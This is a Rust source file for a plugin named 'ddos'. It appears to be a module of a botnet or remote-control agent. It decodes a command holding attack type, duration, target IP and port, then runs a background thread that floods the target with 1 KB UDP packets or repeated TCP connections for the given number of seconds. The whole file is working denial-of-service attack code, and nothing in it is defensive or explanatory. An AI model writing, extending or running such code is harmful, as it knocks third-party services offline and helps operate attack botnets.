use plugin_api::HostContext;

struct DdosPlugin;

impl DdosPlugin {
    fn new() -> Self {
        Self
    }

    fn opcode(&self) -> u8 {
        0x01
    }

    fn execute(&self, cmd: &[u8], _ctx: &HostContext) -> Result<(), ()> {
        // Command format: [AttackType:1][Duration:2][TargetIP:4][Port:2]
        // AttackType: 1=UDP Flood, 2=TCP Syn (simulated via connect)
        
        if cmd.len() < 9 {
            return Err(());
        }

        let attack_type = cmd[0];
        let duration = u16::from_be_bytes([cmd[1], cmd[2]]) as u64;
        let ip_bytes: [u8; 4] = [cmd[3], cmd[4], cmd[5], cmd[6]];
        let port = u16::from_be_bytes([cmd[7], cmd[8]]);
        let target = format!("{}.{}.{}.{}:{}", ip_bytes[0], ip_bytes[1], ip_bytes[2], ip_bytes[3], port);

        log::info!("[DDoS] Starting Attack Type {} on {} for {}s", attack_type, target, duration);

        let target = std::sync::Arc::new(target);
        
        std::thread::spawn(move || {
            let start = std::time::Instant::now();
            while start.elapsed().as_secs() < duration {
                match attack_type {
                    1 => { // UDP Flood
                        if let Ok(socket) = std::net::UdpSocket::bind("0.0.0.0:0") {
                            let payload = [0u8; 1024]; // 1KB junk
                            let _ = socket.send_to(&payload, target.as_str());
                        }
                    },
                    2 => { // TCP Connect Flood
                         if let Ok(_) = std::net::TcpStream::connect(target.as_str()) {
                             // Just connect and drop
                         }
                    },
                    _ => break
                }
            }
            log::info!("[DDoS] Attack Finished");
        });

        Ok(())
    }
}

plugin_api::declare_plugin!(DdosPlugin, "ddos");
